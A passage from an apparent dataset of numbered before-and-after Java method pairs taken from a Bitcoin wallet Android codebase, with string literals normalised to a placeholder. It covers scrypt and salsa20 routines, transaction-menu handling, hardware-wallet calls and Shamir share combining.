 * @throws GeneralSecurityException when HMAC_SHA256 is not available.
 * @throws InterruptedException
 */
public static byte[] scrypt(byte[] passwd,byte[] salt,int N,int r,int p,int dkLen,SCryptProgress progressTracker) throws GeneralSecurityException, InterruptedException {
  if (N == 0 || (N & (N - 1)) != 0)   throw new IllegalArgumentException(""String_Node_Str"");
  if (N > MAX_VALUE / 128 / r)   throw new IllegalArgumentException(""String_Node_Str"");
  if (r > MAX_VALUE / 128 / p)   throw new IllegalArgumentException(""String_Node_Str"");
  Mac mac=Mac.getInstance(""String_Node_Str"");
  mac.init(new SecretKeySpec(passwd,""String_Node_Str""));
  byte[] DK=new byte[dkLen];
  byte[] B=new byte[128 * r * p];
  byte[] XY=new byte[256 * r];
  byte[][] V=new byte[N][];
  for (int i=0; i < N; i++) {
    V[i]=new byte[128 * r];
  }
  int i;
  PBKDF.pbkdf2(mac,salt,1,B,p * 128 * r);
  for (i=0; i < p; i++) {
    smix(B,i * 128 * r,r,N,V,XY,progressTracker);
    if (progressTracker != null) {
      progressTracker.setProgressP(i + 1);
    }
  }
  PBKDF.pbkdf2(mac,B,1,DK,dkLen);
  return DK;
}"
91208,"public static void blockxor(byte[] S,int Si,byte[] D,int Di,int len){
  for (int i=0; i < len; i++) {
    D[Di + i]^=S[Si + i];
  }
}","private static void blockxor(byte[] S,int Si,byte[] D,int Di,int len){
  for (int i=0; i < len; i++) {
    D[Di + i]^=S[Si + i];
  }
}"
91209,"public static void blockmix_salsa8(byte[] BY,int Bi,int Yi,int r){
  byte[] X=new byte[64];
  int i;
  arraycopy(BY,Bi + (2 * r - 1) * 64,X,0,64);
  for (i=0; i < 2 * r; i++) {
    blockxor(BY,i * 64,X,0,64);
    salsa20_8(X);
    arraycopy(X,0,BY,Yi + (i * 64),64);
  }
  for (i=0; i < r; i++) {
    arraycopy(BY,Yi + (i * 2) * 64,BY,Bi + (i * 64),64);
  }
  for (i=0; i < r; i++) {
    arraycopy(BY,Yi + (i * 2 + 1) * 64,BY,Bi + (i + r) * 64,64);
  }
}","private static void blockmix_salsa8(byte[] BY,int Bi,int Yi,int r){
  byte[] X=new byte[64];
  int i;
  arraycopy(BY,Bi + (2 * r - 1) * 64,X,0,64);
  for (i=0; i < 2 * r; i++) {
    blockxor(BY,i * 64,X,0,64);
    salsa20_8(X);
    arraycopy(X,0,BY,Yi + (i * 64),64);
  }
  for (i=0; i < r; i++) {
    arraycopy(BY,Yi + (i * 2) * 64,BY,Bi + (i * 64),64);
  }
  for (i=0; i < r; i++) {
    arraycopy(BY,Yi + (i * 2 + 1) * 64,BY,Bi + (i + r) * 64,64);
  }
}"
91210,"public static void salsa20_8(byte[] B){
  int[] B32=new int[16];
  int[] x=new int[16];
  int i;
  for (i=0; i < 16; i++) {
    B32[i]=(B[i * 4 + 0] & 0xff) << 0;
    B32[i]|=(B[i * 4 + 1] & 0xff) << 8;
    B32[i]|=(B[i * 4 + 2] & 0xff) << 16;
    B32[i]|=(B[i * 4 + 3] & 0xff) << 24;
  }
  arraycopy(B32,0,x,0,16);
  for (i=8; i > 0; i-=2) {
    x[4]^=R(x[0] + x[12],7);
    x[8]^=R(x[4] + x[0],9);
    x[12]^=R(x[8] + x[4],13);
    x[0]^=R(x[12] + x[8],18);
    x[9]^=R(x[5] + x[1],7);
    x[13]^=R(x[9] + x[5],9);
    x[1]^=R(x[13] + x[9],13);
    x[5]^=R(x[1] + x[13],18);
    x[14]^=R(x[10] + x[6],7);
    x[2]^=R(x[14] + x[10],9);
    x[6]^=R(x[2] + x[14],13);
    x[10]^=R(x[6] + x[2],18);
    x[3]^=R(x[15] + x[11],7);
    x[7]^=R(x[3] + x[15],9);
    x[11]^=R(x[7] + x[3],13);
    x[15]^=R(x[11] + x[7],18);
    x[1]^=R(x[0] + x[3],7);
    x[2]^=R(x[1] + x[0],9);
    x[3]^=R(x[2] + x[1],13);
    x[0]^=R(x[3] + x[2],18);
    x[6]^=R(x[5] + x[4],7);
    x[7]^=R(x[6] + x[5],9);
    x[4]^=R(x[7] + x[6],13);
    x[5]^=R(x[4] + x[7],18);
    x[11]^=R(x[10] + x[9],7);
    x[8]^=R(x[11] + x[10],9);
    x[9]^=R(x[8] + x[11],13);
    x[10]^=R(x[9] + x[8],18);
    x[12]^=R(x[15] + x[14],7);
    x[13]^=R(x[12] + x[15],9);
    x[14]^=R(x[13] + x[12],13);
    x[15]^=R(x[14] + x[13],18);
  }
  for (i=0; i < 16; ++i)   B32[i]=x[i] + B32[i];
  for (i=0; i < 16; i++) {
    B[i * 4 + 0]=(byte)(B32[i] >> 0 & 0xff);
    B[i * 4 + 1]=(byte)(B32[i] >> 8 & 0xff);
    B[i * 4 + 2]=(byte)(B32[i] >> 16 & 0xff);
    B[i * 4 + 3]=(byte)(B32[i] >> 24 & 0xff);
  }
}","private static void salsa20_8(byte[] B){
  int[] B32=new int[16];
  int[] x=new int[16];
  int i;
  for (i=0; i < 16; i++) {
    B32[i]=(B[i * 4 + 0] & 0xff) << 0;
    B32[i]|=(B[i * 4 + 1] & 0xff) << 8;
    B32[i]|=(B[i * 4 + 2] & 0xff) << 16;
    B32[i]|=(B[i * 4 + 3] & 0xff) << 24;
  }
  arraycopy(B32,0,x,0,16);
  for (i=8; i > 0; i-=2) {
    x[4]^=R(x[0] + x[12],7);
    x[8]^=R(x[4] + x[0],9);
    x[12]^=R(x[8] + x[4],13);
    x[0]^=R(x[12] + x[8],18);
    x[9]^=R(x[5] + x[1],7);
    x[13]^=R(x[9] + x[5],9);
    x[1]^=R(x[13] + x[9],13);
    x[5]^=R(x[1] + x[13],18);
    x[14]^=R(x[10] + x[6],7);
    x[2]^=R(x[14] + x[10],9);
    x[6]^=R(x[2] + x[14],13);
    x[10]^=R(x[6] + x[2],18);
    x[3]^=R(x[15] + x[11],7);
    x[7]^=R(x[3] + x[15],9);
    x[11]^=R(x[7] + x[3],13);
    x[15]^=R(x[11] + x[7],18);
    x[1]^=R(x[0] + x[3],7);
    x[2]^=R(x[1] + x[0],9);
    x[3]^=R(x[2] + x[1],13);
    x[0]^=R(x[3] + x[2],18);
    x[6]^=R(x[5] + x[4],7);
    x[7]^=R(x[6] + x[5],9);
    x[4]^=R(x[7] + x[6],13);
    x[5]^=R(x[4] + x[7],18);
    x[11]^=R(x[10] + x[9],7);
    x[8]^=R(x[11] + x[10],9);
    x[9]^=R(x[8] + x[11],13);
    x[10]^=R(x[9] + x[8],18);
    x[12]^=R(x[15] + x[14],7);
    x[13]^=R(x[12] + x[15],9);
    x[14]^=R(x[13] + x[12],13);
    x[15]^=R(x[14] + x[13],18);
  }
  for (i=0; i < 16; ++i)   B32[i]=x[i] + B32[i];
  for (i=0; i < 16; i++) {
    B[i * 4 + 0]=(byte)(B32[i] >> 0 & 0xff);
    B[i * 4 + 1]=(byte)(B32[i] >> 8 & 0xff);
    B[i * 4 + 2]=(byte)(B32[i] >> 16 & 0xff);
    B[i * 4 + 3]=(byte)(B32[i] >> 24 & 0xff);
  }
}"
91211,"@Override public boolean onActionItemClicked(ActionMode actionMode,MenuItem menuItem){
  final int itemId=menuItem.getItemId();
  if (itemId == R.id.miShowCoinapultDebug) {
    if (record instanceof CoinapultTransactionSummary) {
      final CoinapultTransactionSummary summary=(CoinapultTransactionSummary)record;
      new AlertDialog.Builder(_context).setMessage(summary.input.toString()).setNeutralButton(R.string.copy,new DialogInterface.OnClickListener(){
        @Override public void onClick(        DialogInterface dialog,        int which){
          Utils.setClipboardString(summary.input.toString(),TransactionHistoryFragment.this.getActivity());
          Toast.makeText(TransactionHistoryFragment.this.getActivity(),R.string.copied_to_clipboard,Toast.LENGTH_SHORT).show();
          dialog.dismiss();
        }
      }
).setPositiveButton(R.string.ok,new DialogInterface.OnClickListener(){
        @Override public void onClick(        DialogInterface dialog,        int which){
          dialog.dismiss();
        }
      }
).show();
    }
    return true;
  }
switch (itemId) {
case R.id.miShowDetails:
    doShowDetails(record);
  finishActionMode();
return true;
case R.id.miSetLabel:
setTransactionLabel(record);
finishActionMode();
break;
case R.id.miAddToAddressBook:
EnterAddressLabelUtil.enterAddressLabel(getActivity(),_mbwManager.getMetadataStorage(),record.destinationAddress.get(),""String_Node_Str"",addressLabelChanged);
break;
case R.id.miCancelTransaction:
new AlertDialog.Builder(getActivity()).setTitle(_context.getString(R.string.remove_queued_transaction_title)).setMessage(_context.getString(R.string.remove_queued_transaction)).setPositiveButton(R.string.yes,new DialogInterface.OnClickListener(){
@Override public void onClick(DialogInterface dialog,int which){
boolean okay=_mbwManager.getSelectedAccount().cancelQueuedTransaction(record.txid);
dialog.dismiss();
updateTransactionHistory();
if (okay) {
Utils.showSimpleMessageDialog(getActivity(),_context.getString(R.string.remove_queued_transaction_hint));
}
 else {
new Toaster(getActivity()).toast(_context.getString(R.string.remove_queued_transaction_error),false);
}
}
}
).setNegativeButton(R.string.no,new DialogInterface.OnClickListener(){
@Override public void onClick(DialogInterface dialog,int which){
dialog.dismiss();
}
}
).create().show();
break;
case R.id.miDeleteUnconfirmedTransaction:
new AlertDialog.Builder(getActivity()).setTitle(_context.getString(R.string.delete_unconfirmed_transaction_title)).setMessage(_context.getString(R.string.warning_delete_unconfirmed_transaction)).setPositiveButton(R.string.yes,new DialogInterface.OnClickListener(){
@Override public void onClick(DialogInterface dialog,int which){
_mbwManager.getSelectedAccount().deleteTransaction(record.txid);
dialog.dismiss();
updateTransactionHistory();
}
}
).setNegativeButton(R.string.no,new DialogInterface.OnClickListener(){
@Override public void onClick(DialogInterface dialog,int which){
dialog.dismiss();
}
}
).create().show();
break;
case R.id.miRebroadcastTransaction:
new AlertDialog.Builder(getActivity()).setTitle(_context.getString(R.string.rebroadcast_transaction_title)).setMessage(_context.getString(R.string.description_rebroadcast_transaction)).setPositiveButton(R.string.yes,new DialogInterface.OnClickListener(){
@Override public void onClick(DialogInterface dialog,int which){
boolean success=BroadcastTransactionActivity.callMe(getActivity(),_mbwManager.getSelectedAccount(),record.txid);
if (!success) {
Utils.showSimpleMessageDialog(getActivity(),_context.getString(R.string.message_rebroadcast_successfull));
}
dialog.dismiss();
}
}
).setNegativeButton(R.string.no,new DialogInterface.OnClickListener(){
@Override public void onClick(DialogInterface dialog,int which){
dialog.dismiss();
}
}
).create().show();
break;
case R.id.miBumpFee:
new AlertDialog.Builder(getActivity()).setTitle(_context.getString(R.string.bump_fee_title)).setMessage(_context.getString(R.string.description_bump_fee)).setPositiveButton(R.string.yes,new DialogInterface.OnClickListener(){
@Override public void onClick(DialogInterface dialog,int which){
Intent intent=SendMainActivity.getIntent(getActivity(),_mbwManager.getSelectedAccount().getId(),record.txid,false);
startActivity(intent);
dialog.dismiss();
}
}
).setNegativeButton(R.string.no,new DialogInterface.OnClickListener(){
@Override public void onClick(DialogInterface dialog,int which){
dialog.dismiss();
}
}
).create().show();
break;
}
return false;
}","@Override public boolean onActionItemClicked(ActionMode actionMode,MenuItem menuItem){
  final int itemId=menuItem.getItemId();
  if (itemId == R.id.miShowCoinapultDebug) {
    if (record instanceof CoinapultTransactionSummary) {
      final CoinapultTransactionSummary summary=(CoinapultTransactionSummary)record;
      new AlertDialog.Builder(_context).setMessage(summary.input.toString()).setNeutralButton(R.string.copy,new DialogInterface.OnClickListener(){
        @Override public void onClick(        DialogInterface dialog,        int which){
          Utils.setClipboardString(summary.input.toString(),TransactionHistoryFragment.this.getActivity());
          Toast.makeText(TransactionHistoryFragment.this.getActivity(),R.string.copied_to_clipboard,Toast.LENGTH_SHORT).show();
          dialog.dismiss();
        }
      }
).setPositiveButton(R.string.ok,new DialogInterface.OnClickListener(){
        @Override public void onClick(        DialogInterface dialog,        int which){
          dialog.dismiss();
        }
      }
).show();
    }
    return true;
  }
switch (itemId) {
case R.id.miShowDetails:
    doShowDetails(record);
  finishActionMode();
return true;
case R.id.miSetLabel:
setTransactionLabel(record);
finishActionMode();
break;
case R.id.miAddToAddressBook:
EnterAddressLabelUtil.enterAddressLabel(getActivity(),_mbwManager.getMetadataStorage(),record.destinationAddress.get(),""String_Node_Str"",addressLabelChanged);
break;
case R.id.miCancelTransaction:
new AlertDialog.Builder(getActivity()).setTitle(_context.getString(R.string.remove_queued_transaction_title)).setMessage(_context.getString(R.string.remove_queued_transaction)).setPositiveButton(R.string.yes,new DialogInterface.OnClickListener(){
@Override public void onClick(DialogInterface dialog,int which){
boolean okay=_mbwManager.getSelectedAccount().cancelQueuedTransaction(record.txid);
dialog.dismiss();
updateTransactionHistory();
if (okay) {
Utils.showSimpleMessageDialog(getActivity(),_context.getString(R.string.remove_queued_transaction_hint));
}
 else {
new Toaster(getActivity()).toast(_context.getString(R.string.remove_queued_transaction_error),false);
}
}
}
).setNegativeButton(R.string.no,new DialogInterface.OnClickListener(){
@Override public void onClick(DialogInterface dialog,int which){
dialog.dismiss();
}
}
).create().show();
break;
case R.id.miDeleteUnconfirmedTransaction:
new AlertDialog.Builder(getActivity()).setTitle(_context.getString(R.string.delete_unconfirmed_transaction_title)).setMessage(_context.getString(R.string.warning_delete_unconfirmed_transaction)).setPositiveButton(R.string.yes,new DialogInterface.OnClickListener(){
@Override public void onClick(DialogInterface dialog,int which){
_mbwManager.getSelectedAccount().deleteTransaction(record.txid);
dialog.dismiss();
updateTransactionHistory();
}
}
).setNegativeButton(R.string.no,new DialogInterface.OnClickListener(){
@Override public void onClick(DialogInterface dialog,int which){
dialog.dismiss();
}
}
).create().show();
break;
case R.id.miRebroadcastTransaction:
new AlertDialog.Builder(getActivity()).setTitle(_context.getString(R.string.rebroadcast_transaction_title)).setMessage(_context.getString(R.string.description_rebroadcast_transaction)).setPositiveButton(R.string.yes,new DialogInterface.OnClickListener(){
@Override public void onClick(DialogInterface dialog,int which){
boolean success=BroadcastTransactionActivity.callMe(getActivity(),_mbwManager.getSelectedAccount(),record.txid);
if (!success) {
Utils.showSimpleMessageDialog(getActivity(),_context.getString(R.string.message_rebroadcast_failed));
}
dialog.dismiss();
}
}
).setNegativeButton(R.string.no,new DialogInterface.OnClickListener(){
@Override public void onClick(DialogInterface dialog,int which){
dialog.dismiss();
}
}
).create().show();
break;
case R.id.miBumpFee:
new AlertDialog.Builder(getActivity()).setTitle(_context.getString(R.string.bump_fee_title)).setMessage(_context.getString(R.string.description_bump_fee)).setPositiveButton(R.string.yes,new DialogInterface.OnClickListener(){
@Override public void onClick(DialogInterface dialog,int which){
Intent intent=SendMainActivity.getIntent(getActivity(),_mbwManager.getSelectedAccount().getId(),record.txid,false);
startActivity(intent);
dialog.dismiss();
}
}
).setNegativeButton(R.string.no,new DialogInterface.OnClickListener(){
@Override public void onClick(DialogInterface dialog,int which){
dialog.dismiss();
}
}
).create().show();
break;
}
return false;
}"
91212,"@Override public View getView(final int position,View convertView,ViewGroup parent){
  View rowView=super.getView(position,convertView,parent);
  if (!isAdded()) {
    return rowView;
  }
  final TransactionSummary record=checkNotNull(getItem(position));
  final ActionBarActivity actionBarActivity=(ActionBarActivity)getActivity();
  rowView.setOnClickListener(new View.OnClickListener(){
    @Override public void onClick(    final View view){
      currentActionMode=actionBarActivity.startSupportActionMode(new ActionMode.Callback(){
        @Override public boolean onCreateActionMode(        ActionMode actionMode,        Menu menu){
          actionMode.getMenuInflater().inflate(R.menu.transaction_history_context_menu,menu);
          updateActionBar(actionMode,menu);
          return true;
        }
        @Override public boolean onPrepareActionMode(        ActionMode actionMode,        Menu menu){
          updateActionBar(actionMode,menu);
          return true;
        }
        private void updateActionBar(        ActionMode actionMode,        Menu menu){
          checkNotNull(menu.findItem(R.id.miAddToAddressBook)).setVisible(record.hasAddressBook());
          checkNotNull(menu.findItem(R.id.miCancelTransaction)).setVisible(record.canCancel());
          checkNotNull(menu.findItem(R.id.miShowDetails)).setVisible(record.hasDetails());
          checkNotNull(menu.findItem(R.id.miShowCoinapultDebug)).setVisible(record.canCoinapult());
          checkNotNull(menu.findItem(R.id.miRebroadcastTransaction)).setVisible((record.confirmations == 0) && !record.canCoinapult());
          checkNotNull(menu.findItem(R.id.miBumpFee)).setVisible((record.confirmations == 0) && !record.canCoinapult());
          checkNotNull(menu.findItem(R.id.miDeleteUnconfirmedTransaction)).setVisible(false);
          currentActionMode=actionMode;
          ((ListView)_root.findViewById(R.id.lvTransactionHistory)).setItemChecked(position,true);
        }
        @Override public boolean onActionItemClicked(        ActionMode actionMode,        MenuItem menuItem){
          final int itemId=menuItem.getItemId();
          if (itemId == R.id.miShowCoinapultDebug) {
            if (record instanceof CoinapultTransactionSummary) {
              final CoinapultTransactionSummary summary=(CoinapultTransactionSummary)record;
              new AlertDialog.Builder(_context).setMessage(summary.input.toString()).setNeutralButton(R.string.copy,new DialogInterface.OnClickListener(){
                @Override public void onClick(                DialogInterface dialog,                int which){
                  Utils.setClipboardString(summary.input.toString(),TransactionHistoryFragment.this.getActivity());
                  Toast.makeText(TransactionHistoryFragment.this.getActivity(),R.string.copied_to_clipboard,Toast.LENGTH_SHORT).show();
                  dialog.dismiss();
                }
              }
).setPositiveButton(R.string.ok,new DialogInterface.OnClickListener(){
                @Override public void onClick(                DialogInterface dialog,                int which){
                  dialog.dismiss();
                }
              }
).show();
            }
            return true;
          }
switch (itemId) {
case R.id.miShowDetails:
            doShowDetails(record);
          finishActionMode();
        return true;
case R.id.miSetLabel:
      setTransactionLabel(record);
    finishActionMode();
  break;
case R.id.miAddToAddressBook:
EnterAddressLabelUtil.enterAddressLabel(getActivity(),_mbwManager.getMetadataStorage(),record.destinationAddress.get(),""String_Node_Str"",addressLabelChanged);
break;
case R.id.miCancelTransaction:
new AlertDialog.Builder(getActivity()).setTitle(_context.getString(R.string.remove_queued_transaction_title)).setMessage(_context.getString(R.string.remove_queued_transaction)).setPositiveButton(R.string.yes,new DialogInterface.OnClickListener(){
@Override public void onClick(DialogInterface dialog,int which){
boolean okay=_mbwManager.getSelectedAccount().cancelQueuedTransaction(record.txid);
dialog.dismiss();
updateTransactionHistory();
if (okay) {
  Utils.showSimpleMessageDialog(getActivity(),_context.getString(R.string.remove_queued_transaction_hint));
}
 else {
  new Toaster(getActivity()).toast(_context.getString(R.string.remove_queued_transaction_error),false);
}
}
}
).setNegativeButton(R.string.no,new DialogInterface.OnClickListener(){
@Override public void onClick(DialogInterface dialog,int which){
dialog.dismiss();
}
}
).create().show();
break;
case R.id.miDeleteUnconfirmedTransaction:
new AlertDialog.Builder(getActivity()).setTitle(_context.getString(R.string.delete_unconfirmed_transaction_title)).setMessage(_context.getString(R.string.warning_delete_unconfirmed_transaction)).setPositiveButton(R.string.yes,new DialogInterface.OnClickListener(){
@Override public void onClick(DialogInterface dialog,int which){
_mbwManager.getSelectedAccount().deleteTransaction(record.txid);
dialog.dismiss();
updateTransactionHistory();
}
}
).setNegativeButton(R.string.no,new DialogInterface.OnClickListener(){
@Override public void onClick(DialogInterface dialog,int which){
dialog.dismiss();
}
}
).create().show();
break;
case R.id.miRebroadcastTransaction:
new AlertDialog.Builder(getActivity()).setTitle(_context.getString(R.string.rebroadcast_transaction_title)).setMessage(_context.getString(R.string.description_rebroadcast_transaction)).setPositiveButton(R.string.yes,new DialogInterface.OnClickListener(){
@Override public void onClick(DialogInterface dialog,int which){
boolean success=BroadcastTransactionActivity.callMe(getActivity(),_mbwManager.getSelectedAccount(),record.txid);
if (!success) {
Utils.showSimpleMessageDialog(getActivity(),_context.getString(R.string.message_rebroadcast_successfull));
}
dialog.dismiss();
}
}
).setNegativeButton(R.string.no,new DialogInterface.OnClickListener(){
@Override public void onClick(DialogInterface dialog,int which){
dialog.dismiss();
}
}
).create().show();
break;
case R.id.miBumpFee:
new AlertDialog.Builder(getActivity()).setTitle(_context.getString(R.string.bump_fee_title)).setMessage(_context.getString(R.string.description_bump_fee)).setPositiveButton(R.string.yes,new DialogInterface.OnClickListener(){
@Override public void onClick(DialogInterface dialog,int which){
Intent intent=SendMainActivity.getIntent(getActivity(),_mbwManager.getSelectedAccount().getId(),record.txid,false);
startActivity(intent);
dialog.dismiss();
}
}
).setNegativeButton(R.string.no,new DialogInterface.OnClickListener(){
@Override public void onClick(DialogInterface dialog,int which){
dialog.dismiss();
}
}
).create().show();
break;
}
return false;
}
@Override public void onDestroyActionMode(ActionMode actionMode){
((ListView)_root.findViewById(R.id.lvTransactionHistory)).setItemChecked(position,false);
currentActionMode=null;
}
}
);
}
}
);
return rowView;
}","@Override public View getView(final int position,View convertView,ViewGroup parent){
  View rowView=super.getView(position,convertView,parent);
  if (!isAdded()) {
    return rowView;
  }
  final TransactionSummary record=checkNotNull(getItem(position));
  final ActionBarActivity actionBarActivity=(ActionBarActivity)getActivity();
  rowView.setOnClickListener(new View.OnClickListener(){
    @Override public void onClick(    final View view){
      currentActionMode=actionBarActivity.startSupportActionMode(new ActionMode.Callback(){
        @Override public boolean onCreateActionMode(        ActionMode actionMode,        Menu menu){
          actionMode.getMenuInflater().inflate(R.menu.transaction_history_context_menu,menu);
          updateActionBar(actionMode,menu);
          return true;
        }
        @Override public boolean onPrepareActionMode(        ActionMode actionMode,        Menu menu){
          updateActionBar(actionMode,menu);
          return true;
        }
        private void updateActionBar(        ActionMode actionMode,        Menu menu){
          checkNotNull(menu.findItem(R.id.miAddToAddressBook)).setVisible(record.hasAddressBook());
          checkNotNull(menu.findItem(R.id.miCancelTransaction)).setVisible(record.canCancel());
          checkNotNull(menu.findItem(R.id.miShowDetails)).setVisible(record.hasDetails());
          checkNotNull(menu.findItem(R.id.miShowCoinapultDebug)).setVisible(record.canCoinapult());
          checkNotNull(menu.findItem(R.id.miRebroadcastTransaction)).setVisible((record.confirmations == 0) && !record.canCoinapult());
          checkNotNull(menu.findItem(R.id.miBumpFee)).setVisible((record.confirmations == 0) && !record.canCoinapult());
          checkNotNull(menu.findItem(R.id.miDeleteUnconfirmedTransaction)).setVisible(false);
          currentActionMode=actionMode;
          ((ListView)_root.findViewById(R.id.lvTransactionHistory)).setItemChecked(position,true);
        }
        @Override public boolean onActionItemClicked(        ActionMode actionMode,        MenuItem menuItem){
          final int itemId=menuItem.getItemId();
          if (itemId == R.id.miShowCoinapultDebug) {
            if (record instanceof CoinapultTransactionSummary) {
              final CoinapultTransactionSummary summary=(CoinapultTransactionSummary)record;
              new AlertDialog.Builder(_context).setMessage(summary.input.toString()).setNeutralButton(R.string.copy,new DialogInterface.OnClickListener(){
                @Override public void onClick(                DialogInterface dialog,                int which){
                  Utils.setClipboardString(summary.input.toString(),TransactionHistoryFragment.this.getActivity());
                  Toast.makeText(TransactionHistoryFragment.this.getActivity(),R.string.copied_to_clipboard,Toast.LENGTH_SHORT).show();
                  dialog.dismiss();
                }
              }
).setPositiveButton(R.string.ok,new DialogInterface.OnClickListener(){
                @Override public void onClick(                DialogInterface dialog,                int which){
                  dialog.dismiss();
                }
              }
).show();
            }
            return true;
          }
switch (itemId) {
case R.id.miShowDetails:
            doShowDetails(record);
          finishActionMode();
        return true;
case R.id.miSetLabel:
      setTransactionLabel(record);
    finishActionMode();
  break;
case R.id.miAddToAddressBook:
EnterAddressLabelUtil.enterAddressLabel(getActivity(),_mbwManager.getMetadataStorage(),record.destinationAddress.get(),""String_Node_Str"",addressLabelChanged);
break;
case R.id.miCancelTransaction:
new AlertDialog.Builder(getActivity()).setTitle(_context.getString(R.string.remove_queued_transaction_title)).setMessage(_context.getString(R.string.remove_queued_transaction)).setPositiveButton(R.string.yes,new DialogInterface.OnClickListener(){
@Override public void onClick(DialogInterface dialog,int which){
boolean okay=_mbwManager.getSelectedAccount().cancelQueuedTransaction(record.txid);
dialog.dismiss();
updateTransactionHistory();
if (okay) {
  Utils.showSimpleMessageDialog(getActivity(),_context.getString(R.string.remove_queued_transaction_hint));
}
 else {
  new Toaster(getActivity()).toast(_context.getString(R.string.remove_queued_transaction_error),false);
}
}
}
).setNegativeButton(R.string.no,new DialogInterface.OnClickListener(){
@Override public void onClick(DialogInterface dialog,int which){
dialog.dismiss();
}
}
).create().show();
break;
case R.id.miDeleteUnconfirmedTransaction:
new AlertDialog.Builder(getActivity()).setTitle(_context.getString(R.string.delete_unconfirmed_transaction_title)).setMessage(_context.getString(R.string.warning_delete_unconfirmed_transaction)).setPositiveButton(R.string.yes,new DialogInterface.OnClickListener(){
@Override public void onClick(DialogInterface dialog,int which){
_mbwManager.getSelectedAccount().deleteTransaction(record.txid);
dialog.dismiss();
updateTransactionHistory();
}
}
).setNegativeButton(R.string.no,new DialogInterface.OnClickListener(){
@Override public void onClick(DialogInterface dialog,int which){
dialog.dismiss();
}
}
).create().show();
break;
case R.id.miRebroadcastTransaction:
new AlertDialog.Builder(getActivity()).setTitle(_context.getString(R.string.rebroadcast_transaction_title)).setMessage(_context.getString(R.string.description_rebroadcast_transaction)).setPositiveButton(R.string.yes,new DialogInterface.OnClickListener(){
@Override public void onClick(DialogInterface dialog,int which){
boolean success=BroadcastTransactionActivity.callMe(getActivity(),_mbwManager.getSelectedAccount(),record.txid);
if (!success) {
Utils.showSimpleMessageDialog(getActivity(),_context.getString(R.string.message_rebroadcast_failed));
}
dialog.dismiss();
}
}
).setNegativeButton(R.string.no,new DialogInterface.OnClickListener(){
@Override public void onClick(DialogInterface dialog,int which){
dialog.dismiss();
}
}
).create().show();
break;
case R.id.miBumpFee:
new AlertDialog.Builder(getActivity()).setTitle(_context.getString(R.string.bump_fee_title)).setMessage(_context.getString(R.string.description_bump_fee)).setPositiveButton(R.string.yes,new DialogInterface.OnClickListener(){
@Override public void onClick(DialogInterface dialog,int which){
Intent intent=SendMainActivity.getIntent(getActivity(),_mbwManager.getSelectedAccount().getId(),record.txid,false);
startActivity(intent);
dialog.dismiss();
}
}
).setNegativeButton(R.string.no,new DialogInterface.OnClickListener(){
@Override public void onClick(DialogInterface dialog,int which){
dialog.dismiss();
}
}
).create().show();
break;
}
return false;
}
@Override public void onDestroyActionMode(ActionMode actionMode){
((ListView)_root.findViewById(R.id.lvTransactionHistory)).setItemChecked(position,false);
currentActionMode=null;
}
}
);
}
}
);
return rowView;
}"
91213,"public BTChipOutput finalizeInput(byte[] outputScript,String outputAddress,String amount,String fees,String changePath) throws BTChipException {
  boolean oldAPI;
  byte[] path=null;
  if (changePath != null) {
    path=BIP32Utils.splitPath(changePath);
    resolvePath(changePath);
    exchangeApdu(BTCHIP_CLA,BTCHIP_INS_HASH_INPUT_FINALIZE_FULL,(byte)0xFF,(byte)0x00,path,null);
    oldAPI=((lastSW == SW_INCORRECT_P1_P2) || (lastSW == SW_WRONG_P1_P2) || (lastSW == SW_CONDITIONS_NOT_SATISFIED));
  }
 else {
    exchangeApdu(BTCHIP_CLA,BTCHIP_INS_HASH_INPUT_FINALIZE_FULL,(byte)0xFF,(byte)0x00,new byte[1],null);
    oldAPI=((lastSW == SW_INCORRECT_P1_P2) || (lastSW == SW_WRONG_P1_P2) || (lastSW == SW_CONDITIONS_NOT_SATISFIED));
  }
  if (oldAPI) {
    return finalizeInput(outputAddress,amount,fees,changePath);
  }
 else {
    return finalizeInputFull(outputScript,null,true);
  }
}","public BTChipOutput finalizeInput(byte[] outputScript,String outputAddress,String amount,String fees,String changePath) throws BTChipException {
  boolean oldAPI;
  byte[] path;
  if (changePath != null) {
    path=BIP32Utils.splitPath(changePath);
    resolvePath(changePath);
    exchangeApdu(BTCHIP_CLA,BTCHIP_INS_HASH_INPUT_FINALIZE_FULL,(byte)0xFF,(byte)0x00,path,null);
    oldAPI=((lastSW == SW_INCORRECT_P1_P2) || (lastSW == SW_WRONG_P1_P2) || (lastSW == SW_CONDITIONS_NOT_SATISFIED));
  }
 else {
    exchangeApdu(BTCHIP_CLA,BTCHIP_INS_HASH_INPUT_FINALIZE_FULL,(byte)0xFF,(byte)0x00,new byte[1],null);
    oldAPI=((lastSW == SW_INCORRECT_P1_P2) || (lastSW == SW_WRONG_P1_P2) || (lastSW == SW_CONDITIONS_NOT_SATISFIED));
  }
  if (oldAPI) {
    return finalizeInput(outputAddress,amount,fees,changePath);
  }
 else {
    return finalizeInputFull(outputScript,null,true);
  }
}"
91214,"@Test public void testPostcode() throws IOException, RemoteGeocodeException {
  final InputStream stream=Preconditions.checkNotNull(getClass().getResourceAsStream(""String_Node_Str""));
  @SuppressWarnings(""String_Node_Str"") GeocodeResponse response=new GoogleMapsGeocoder(""String_Node_Str"").response2Graph(stream);
}","@Test public void testPostcode() throws IOException, RemoteGeocodeException {
  final InputStream stream=Preconditions.checkNotNull(getClass().getResourceAsStream(""String_Node_Str""));
  new GoogleMapsGeocoder(""String_Node_Str"").response2Graph(stream);
}"
91215,"private void updateUI(){
  BipSss.Share last=shares.get(shares.size() - 1);
  String status=getString(R.string.sss_share_number_scanned,last.shareNumber);
  try {
    String secret=BipSss.combine(shares);
    Intent result=new Intent();
    result.putExtra(RESULT_SECRET,secret);
    setResult(RESULT_OK,result);
    finish();
    return;
  }
 catch (  BipSss.IncompatibleSharesException e) {
    status+=""String_Node_Str"";
    status+=getString(R.string.sss_incompatible_shares_warning);
    shares.remove(last);
  }
catch (  BipSss.NotEnoughSharesException e) {
    status+=""String_Node_Str"";
    if (e.needed == 1) {
      status+=getString(R.string.sss_one_more_share_needed);
    }
 else {
      status+=getString(R.string.sss_more_shares_needed,e.needed);
    }
  }
catch (  BipSss.InvalidContentTypeException e) {
    status+=""String_Node_Str"";
    status=getString(R.string.sss_unrecognized_share_warning);
  }
  ((TextView)findViewById(R.id.tvStatus)).setText(status);
}","private void updateUI(){
  BipSss.Share last=shares.get(shares.size() - 1);
  String status=getString(R.string.sss_share_number_scanned,last.shareNumber);
  try {
    String secret=BipSss.combine(shares);
    Intent result=new Intent();
    result.putExtra(RESULT_SECRET,secret);
    setResult(RESULT_OK,result);
    finish();
    return;
  }
 catch (  BipSss.IncompatibleSharesException e) {
    status+=""String_Node_Str"";
